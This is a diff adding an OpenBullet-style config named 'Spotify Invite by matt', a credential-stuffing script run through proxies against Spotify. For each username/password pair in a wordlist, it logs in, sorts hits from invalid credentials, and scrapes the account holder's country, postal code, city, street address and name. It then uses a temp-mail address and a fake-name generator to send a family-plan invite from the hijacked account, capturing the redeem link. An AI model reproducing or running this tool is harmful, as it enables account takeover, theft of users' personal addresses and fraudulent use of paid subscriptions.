@@ -1,0 +1,203 @@
+[SETTINGS]
+{
+  "Name": "Spotify Invite by matt",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-27T20:43:25.851927+02:00",
+  "AdditionalInfo": "",
+  "Author": "matt",
+  "Version": "1.3.2 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "UserPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://accounts.spotify.com/en/login?continue=https:%2F%2Fwww.spotify.com%2Fus%2Faccount%2Foverview%2F" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<COOKIES(csrf_token)>" LR "" "" -> VAR "CSRF" 
+
+#Login REQUEST POST "https://accounts.spotify.com/api/login" 
+  CONTENT "remember=true&username=<USER>&password=<PASS>&csrf_token=<CSRF>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Check KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "errorInvalidCredentials" 
+  KEYCHAIN Success OR 
+    KEY "smallImageUrl" 
+
+#Capture REQUEST GET "https://www.spotify.com/us/account/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Country PARSE "<SOURCE>" LR "label\":\"Country\",\"value\":\"" "\"}]," -> CAP "Country" 
+
+#Capture REQUEST GET "https://www.spotify.com/us/family/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#XCSRF PARSE "<SOURCE>" LR "CSRF_TOKEN: \"" "\"," -> VAR "XCSRF" 
+
+#GetFullData PARSE "<SOURCE>" LR "familyPlanData: \"" "};" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x7B" "<" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x20" "" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x22" "\"" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x3A" ":" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x2D" "-" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x5D" ")" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x5B" "(" "<FullFamily>" -> VAR "FullFamily" 
+
+#Replace FUNCTION Replace "\\x7D" ">" "<FullFamily>" -> VAR "FullFamily" 
+
+#PostalCode PARSE "<FullFamily>" LR "\"postalCode\":\"" "\",\"" -> CAP "ZipCode" 
+
+#City PARSE "<FullFamily>" LR "\",\"city\":\"" "\",\"line1\":\"" -> CAP "City" 
+
+#Address PARSE "<FullFamily>" LR "\",\"line1\":\"" "\">,\"" -> CAP "Address" 
+
+#Name PARSE "<FullFamily>" LR ",\"fullName\":" ">,\"" -> VAR "Name" 
+
+#FixName FUNCTION Replace "null" "" "<Name>" -> CAP "Name" 
+
+#CanInvite PARSE "<FullFamily>" LR "\">,\"canInvite\":" ",\"" -> VAR "CanInvite" 
+
+#Check KEYCHECK 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<CanInvite>" Contains "false" 
+  KEYCHAIN Success OR 
+    KEY "<CanInvite>" Contains "true" 
+
+#GetEmail REQUEST GET "https://temp-mail.org/en/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Email PARSE "<SOURCE>" LR "opentip\" value=\"" "\" readonly />" -> VAR "Email" 
+
+#PreMailOnly PARSE "<SOURCE>" LR "opentip\" value=\"" "@" -> VAR "Email Only" 
+
+#Domain PARSE "<SOURCE>" LR "<Email Only>@" "\" readonly />" -> VAR "Domain" 
+
+#GetName REQUEST GET "https://www.fakenamegenerator.com/ " 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#First_Name PARSE "<SOURCE>" LR "class=\"address\">" "</h3>" -> VAR "First name of invited" 
+
+#FixFirstName FUNCTION Replace "<h3>" "" "<First name of invited>" -> CAP "First name of invited" 
+
+#Last_Name PARSE "<SOURCE>" LR "Mother's maiden name</dt>" "</dd>" -> VAR "Last name of invited" 
+
+#FixLastName FUNCTION Replace "<dd>" "" "<Last name of invited>" -> CAP "Last name of invited" 
+
+#SendRequest REQUEST POST "https://www.spotify.com/cz/family/api/master-invite-by-email/" 
+  CONTENT "{\"firstName\":\"<First name of invited>\",\"lastName\":\"<Last name of invited>\",\"email\":\"<Email>\"}" 
+  CONTENTTYPE "text/plain;charset=UTF-8" 
+  COOKIE "__bon: MHwwfC0xNDAxNTMwNDkzfC01ODg2NDI4MDcwNnwxfDF8MXwx" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "x-csrf-token: <XCSRF>" 
+
+#Invite_Code PARSE "<SOURCE>" LR "token\":\"" "\",\"" -> CAP "Code" 
+
+#Confirm REQUEST GET "https://temp-mail.org/en/option/change/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "name=\"csrf\" value=\"" "\" style=\"display:none;\" />" -> VAR "Token" 
+
+!#Confirm REQUEST POST "https://temp-mail.org/en/option/change/" 
+!  CONTENT "csrf=<Token>&mail=<Email Only>&domain=@<Domain>" 
+!  CONTENTTYPE "application/x-www-form-urlencoded" 
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#Refresh REQUEST GET "https://temp-mail.org/en/option/refresh/" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+!#GetViewID PARSE "<SOURCE>" LR "subject-title\">" "title=\"" -> VAR "ViewID" 
+
+!#FixUrl FUNCTION Translate 
+!  KEY "<a href=\"" VALUE "" 
+!  KEY "\"" VALUE "" 
+!  "<ViewID>" -> CAP "FixedViewID" 
+
+!#View_Mail REQUEST GET "<FixedViewID>" 
+!  
+!  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+!  HEADER "Pragma: no-cache" 
+!  HEADER "Accept: */*" 
+
+#Final_Invite_Link PARSE "<Token>" LR "" "" -> VAR "Final invite link" 
+
+#FixCountry FUNCTION ToLowercase "<Country>" -> VAR "FixedCountry" 
+
+#Create_link FUNCTION Replace "<Token>" "https://www.spotify.com/<FixedCountry>/family/redeem/?token=<Code>" "<Final invite link>" -> CAP "Final invite link" 
+
+#Capture REQUEST GET "https://www.spotify.com/us/family/overview/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CanInvite PARSE "<SOURCE>" LR "x22canInvite\\x22\\x3A" ",\\x22fullName" -> VAR "CanInviteCheck" 
+
+#Full_Name PARSE "<SOURCE>" LR "</body>" "</html>" -> VAR "Full Name of invited" 
+
+#FixFullName FUNCTION Replace "<Full Name of invited>" "First name: <First name of invited> Last name: <Last name of invited>" "<Full Name of invited>" -> CAP "Full Name of invited" 
+
+#Check KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "<CanInviteCheck>" Contains "false" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<CanInviteCheck>" Contains "true" 
+  KEYCHAIN Failure OR 
+    KEY "<Code>" DoesNotContain "S" 
+
